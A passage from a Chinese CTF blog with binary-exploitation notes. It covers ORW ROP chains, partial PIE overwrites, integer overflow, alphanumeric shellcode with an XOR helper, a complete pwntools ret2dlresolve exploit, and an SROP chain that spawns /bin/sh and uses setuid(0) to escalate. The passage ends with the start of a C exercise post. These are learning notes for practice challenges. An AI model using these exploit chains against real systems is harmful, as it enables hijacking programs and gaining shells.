<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;.</span>/flag\x00\x00<span class="number">&#x27;</span></span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(buf)<span class="comment">//为./flag\x00\x00的存放地址</span></span><br><span class="line">payload+=p64(pop_rsi_pop_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">//在很多程序中不能找到之改变rsi的命令</span></span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(<span class="number">1</span>)+p64(open_plt)</span><br></pre></td></tr></table></figure>

<p>在执行完上面的程序后如果能成功打开文件，对于程序来说回通过rax寄存器返回一个值，对于这个值如果为非负数（一般为4），这表示成功打开这个文件，如果是负数如0xffff则没有打开成功，这个数是文件描述符 fd，将在后边调用read函数作为其中一个参数传入</p>
<p><em>2，调用read将flag文件中内容读到程序中</em></p>
<p>在调用read函数之前要将这三个寄存器改为相应的值</p>
<ol>
<li><code>rdi</code>：设置为文件描述符，即指向已经打开的文件的文件描述符。便是在调用open函数最后通过rax寄存器返回的值（一般为4）</li>
<li><code>rsi</code>：设置为读取数据的缓冲区的地址。找一个可读可写的空地址bss段</li>
<li><code>rdx</code>：设置为要读取的字节数。</li>
<li>rbp：设置为1</li>
</ol>
<p>但是一般在程序中基本不能找到刚好改变这三的寄存器的命令</p>
<p>特别是在动态链接中最多能找到的是改变rdi和rsi的命令，在这里将之前的一种方法再次讲一遍利用__libc_csu_init函数中的两段命令，将一些没有直接修改寄存器的值改变，</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/image-20240312163842964-17115472617563.png" alt="image-20240312163842964"></p>
<p>一般在这个函数的最后这里都会有这两段命令，1，从0x400A3A到0x400A44的修改5个寄存器的值命令。2，从0x400A20到0x400A29的将r13,r14,r15d分别复制到rdx,rsi,edi(这里edi是rdi寄存器的后8位，一般来说对于rdi寄存器来说不会用到前8位，这样一般就可以了)，然后跳转到r12+rbx*8的地址。通过以上两段命令变刚好可将我们需要的三个寄存器的值改变，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)<span class="comment">//为了后面跳转不被影响</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(read_got)<span class="comment">//修改rbp的值，r12为之后要跳转的函数，必须使用got表的地址不能用plt的</span></span><br><span class="line">paylaod+=p64(<span class="number">0</span>x要读取的长度)+p64(buf空的可写可读之地)+p64(<span class="number">4</span>rax的返回值)</span><br><span class="line">payload+p64(csu_init)+b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">0x38</span><span class="comment">//为了将使用这段指令所空出来的值补完便于执行后面需要的命令</span></span><br></pre></td></tr></table></figure>



<p>如此在将这几个寄存器的值修改后便会执行got表的地址运行read函数将文件中的内容读到程序中的设定地</p>
<p><em>3，调用puts函数将内容打印出</em></p>
<p>将之前read函数读取的内容存放之地址放在rdi寄存器中执行plt表的puts函数地址就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_rdi_ret)+p64(buf)+p64(puts_plt)</span><br></pre></td></tr></table></figure>





<p>至此便是通过orw的两方法将flag文件中的内容答应在屏幕上</p>
<p>栈溢出的本意便是通过栈溢出将程序的执行劫持，通过栈溢出将本该执行的栈上的程序通过栈溢出覆盖成自己要想执行命令，如果有的栈所限制的数据太少以至于，连栈迁移的长度都不够，便可以考虑通过栈溢出后将后面要执行的，命令的地址的后面改成其他有用的函数地址，特别是在有pie保护的题中所有的程序只有最后4为数值不同，便可以再栈溢出后加上要挑战的函数的地址的最后的不同的几位，在栈溢出后便会直接跳转到需要执行的函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">0x28</span>+b<span class="number">&#x27;</span>\x69<span class="number">&#x27;</span></span><br></pre></td></tr></table></figure>



<p>对于整数溢出来说，有一种向下溢出，在程序中如果有整数溢出的存在，但一个数被减成负数时在程序中并不会显示成负值反而会成为一个在允许范围内最大的数，0xffff，同理在一个数被加时，当加的超过范围反而会成为特别小的，0x0001，在做这类题时一定要把握不对那个数进行检查就加或减的地方，在这次加和减中将整数溢出成为需要的那个数</p>
<p><strong>纯手搓shellcode</strong></p>
<p>shellcode的本质就是通过syscall的执行调用不同的函数从而实现目的</p>
<p>对于不同的函数其系统的调用号不同，不同的系统调用号也能调用不同的函数，这个函数的系统调用号储存在rax寄存器中如，要通过syscall调用read，则在执行syscall这个命令之前要满足</p>
<p><strong>RAX &#x3D; 0<br>RDI &#x3D; 0<br>RSI &#x3D; 要写入的地址<br>RDX &#x3D; 很大的数</strong></p>
<p>相当于执行了read(RDI,RSI,RDX)，你就可以往RSI这个地方写很多数据，对于不同的函数的系统调用在下面这个中可以查到<a target="_blank" rel="noopener" href="https://blog.csdn.net/SUKI547/article/details/103315487">Linux系统调用表（64位）_系统调用号表-CSDN博客</a></p>
<p>再知道相应的函数的系统调用号以后便可以开始写汇编以满足相应的函数调用，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0</span></span><br><span class="line">mov rdi, <span class="number">0</span></span><br><span class="line">mov rsi, <span class="number">0x88888888</span></span><br><span class="line">mov rdi, <span class="number">0x100</span></span><br><span class="line">syscall    </span><br></pre></td></tr></table></figure>

<p>当程序能执行以上的指令后便可以调用read函数向0x88888888的地方读取0x100的数据，</p>
<p>对于写好的汇编指令要注入到程序中必须换为机器码才能注入到程序中，可以通过以下的网站换为机器码</p>
<p>[Online Assembler and Disassembler (shell-storm.org)](<a target="_blank" rel="noopener" href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=">https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=</a> &amp;arch&#x3D;x86-64&amp;as_format&#x3D;inline#assembly)</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%5Cimage-20240317085245419.png" alt="image-20240317085245419"></p>
<p>对于已知机器码要想换为ascll可以通过以下网站实现</p>
<p><a target="_blank" rel="noopener" href="https://www.bchrt.com/tools/ascii-converter/">ASCII、十六进制、二进制、十进制、Base64转换器 (bchrt.com)</a></p>
<p>但是在很多情况下我们要注入的shellcode是有限制的，有的时候只能输入规定的值如大写字母和数字，像这种情况变要将写的shellcode从16进制的数转为为ascll码的值，如在ascll中A代表41，那么当我们向程序输入A，在程序内部便会存放41如果程序在能执行到这时，便回将那个41当成机器码执行，在ascll码中不同的数相对应的汇编可以在以下的网站中找到</p>
<p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode - NetSec</a></p>
<p>对于限制输入的时候可以通过异或的操作将输入的数转换为需要的数，这里给一个异或的py脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_operation_case1</span>():</span><br><span class="line">    original_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入原数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    xor_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入要对原数进行异或的数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    result = original_num ^ xor_num</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果：&quot;</span>, <span class="built_in">hex</span>(result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(original_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果的二进制表示：&quot;</span>, <span class="built_in">bin</span>(result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_operation_case2</span>():</span><br><span class="line">    original_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入原数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    xor_result = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入异或的结果（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    xor_num = original_num ^ xor_result</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数：&quot;</span>, <span class="built_in">hex</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(original_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;请选择操作：\n1. 知道原数和要对原数进行异或的数求异或的结果；\n2. 知道异或的结果和原数求要对原数进行异或的数（输入1或2）；\n输入 &#x27;exit&#x27; 退出：\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        xor_operation_case1()</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        xor_operation_case2()</span><br><span class="line">    <span class="keyword">elif</span> choice.lower() == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序已退出。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无效的选择。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>ret2dlresolve类题</strong></p>
<p>关于这类题目现将一般做题方法写下来，具体的原理等看看视频在回来补</p>
<p>须知道read函数的plt和got的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eof = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">read_plt = eof.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = eof.got[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>plt表的头地址和这个地址+7或其它的数</p>
<p>bss段的空地址，这个空地址可能需要两个</p>
<p>rdi和rsi寄存器的修改地(如果只修改rsi的没有同时修改rsi和r15的也行，r15一直被修改为0就行)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plt0=<span class="number">0x401020</span></span><br><span class="line">plt_load =p64(plt0+<span class="number">7</span>)</span><br><span class="line">bss=<span class="number">0x404040</span>    </span><br><span class="line">bss_stage =bss + <span class="number">0x100</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x88888888</span>    </span><br><span class="line">pop_rsi_ret=<span class="number">0x88888888</span></span><br></pre></td></tr></table></figure>

<p>还需知道在基本库中函数system和read的地址以及他们两个的差值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_libc=libc.sym[<span class="string">&#x27;system&#x27;</span>]    </span><br><span class="line">read_libc=libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">l_addr =libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>在此之后便可以开始构建其中最重要的基本过程，可以通过以下函数直接构成</p>
<p>其中的第一个需要输入的参数fake_linkmap_add，便是之前找的bss段的空地址，但最好用第二，第一个需要在之后用于存放这一段命令，bss_stage</p>
<p>第二个参数known_func_ptr，便是已知的程序中的read函数的got表的地址，read_got</p>
<p>第三个参数offset，便是库函数中system和read的地址以及他们两个的差值，l_addr</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">	linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))<span class="comment">#l_addr</span></span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">	linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">	linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">	linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">	<span class="keyword">return</span> linkmap</span><br></pre></td></tr></table></figure>

<p>现在便可以开始构建基本payload，和必要过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)</span><br><span class="line">    </span><br><span class="line">payload = flat( b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(栈溢出的垃圾值，rbp+<span class="number">8</span>) ,</span><br><span class="line">               pop_rdi, <span class="number">0</span> ,pop_rsi ,bss_stage ,read_plt<span class="comment">//调用read函数将fake_link_map写入bss</span></span><br><span class="line">			    ,pop_rsi ,<span class="number">0</span> ,pop_rdi ,bss_stage +<span class="number">0x48</span> ,plt_load ,bss_stage ,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>之后便可以直接发个程序了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>综合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"><span class="comment">#p =remote(&#x27;node4.buuoj.cn&#x27;,27108)</span></span><br><span class="line">eof = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">read_plt = eof.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = eof.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment">#vuln_addr = 0x401170</span></span><br><span class="line">plt0 = <span class="number">0x401020</span> <span class="comment">#plt段地址 </span></span><br><span class="line">bss = <span class="number">0x404040</span></span><br><span class="line">bss_stage =bss + <span class="number">0x00</span></span><br><span class="line">l_addr =libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">pop_rdi = <span class="number">0x000000000040115e</span>    <span class="comment">#pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401231</span>    <span class="comment">#pop rsi ; ret#用于解析符号 dl_runtime_resolve  </span></span><br><span class="line">plt_load =p64(plt0+<span class="number">7</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">	linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))<span class="comment">#l_addr</span></span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">	linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">	linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">	linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">	<span class="keyword">return</span> linkmap</span><br><span class="line"> </span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)</span><br><span class="line"> </span><br><span class="line">payload = flat( <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span> ,pop_rdi, <span class="number">0</span> ,pop_rsi ,bss_stage ,<span class="number">0</span>,read_plt</span><br><span class="line">			    ,pop_rsi ,<span class="number">0</span> ,<span class="number">0</span>,pop_rdi ,bss_stage +<span class="number">0x48</span> ,plt_load ,bss_stage ,<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<p><strong>SROP</strong></p>
<p>对于这种题一般有比较明显的特点，必然有通过syscall进行函数调用的地方而不是直接调用函数，</p>
<p>对于像这种不用进行栈迁移的，在程序中有syscall函数调用的</p>
<p>在一开始必须知道得有，rdi寄存器修改，bss段的空地址，plt段的syscall函数地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x88888888</span></span><br><span class="line">bss=<span class="number">0x404040</span></span><br><span class="line">sysacll=<span class="number">0x8888888</span>    </span><br></pre></td></tr></table></figure>

<p>对于srop的基本构造可以直接使用现成的工具构造，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rdi =<span class="number">59</span></span><br><span class="line">frame.rsi =bss <span class="number">-0x30</span></span><br><span class="line">frame.rdx =<span class="number">0</span></span><br><span class="line">frame.rcx =<span class="number">0</span></span><br><span class="line">frame.rsp =bss</span><br><span class="line">frame.rip =syscall<span class="comment">//syscall在plt的地址</span></span><br></pre></td></tr></table></figure>

<p>现在便可以开始构建payload，我们要分两次进行输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*(到rbp的距离)+p64(bss)+p64(能进行输入的函数的开始，以便第二段的输入)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;srop!\n&#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">payload=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*（到rbp的距离）</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">15</span>)+p64(syscall)+flat(frame)<span class="comment">//将srop的基本参数输入</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<p>在通过脚本拿到shell后发现flag不能读出来，发现pwn文件有s级权限，便可以可以用setuid函数执行0，从而获得权限读取flag，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]    </span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line">payload=flat(pop_rdi_ret,<span class="number">0</span>,stuid,用于拿到shell的过程)    </span><br></pre></td></tr></table></figure>



<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/image-20240325200803566-17115472740935.png" alt="image-20240325200803566"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-C语言题目" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/" class="article-date">
  	<time datetime="2024-03-26T13:22:41.000Z" itemprop="datePublished">2024-03-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/">
        C语言题目
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ol>
<li><h4 id="编写一个-C-程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。"><a href="#编写一个-C-程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。" class="headerlink" title="编写一个 C 程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。"></a>编写一个 C 程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。</h4></li>
</ol>
<p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yaml</span><br><span class="line">1: 1</span><br><span class="line">3: 11</span><br><span class="line">7: 111</span><br><span class="line">15: 1111</span><br><span class="line">31: 11111</span><br></pre></td></tr></table></figure>

<p>2定义一个名为 <code>IntegerInfo</code> 的结构体，它包含两个成员变量，一个整型变量 <code>num</code> 用于存储整数，另一个字符串 <code>binary</code> 用于存储整数的二进制表示。编写一个函数，接受一个整数作为参数，返回一个 <code>IntegerInfo</code> 结构体，其中的 <code>num</code> 存储输入整数，<code>binary</code> 存储整数的二进制表示。</p>
<p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">num: 5</span><br><span class="line">binary: 101</span><br></pre></td></tr></table></figure>

<h4 id="3编写一个-C-程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有大于-n-的元素的二进制表示。"><a href="#3编写一个-C-程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有大于-n-的元素的二进制表示。" class="headerlink" title="3编写一个 C 程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数 n 作为参数，返回一个新的数组，其中包含原数组中所有大于 n 的元素的二进制表示。"></a>3编写一个 C 程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数 <code>n</code> 作为参数，返回一个新的数组，其中包含原数组中所有大于 <code>n</code> 的元素的二进制表示。</h4><p>输入示例:</p>
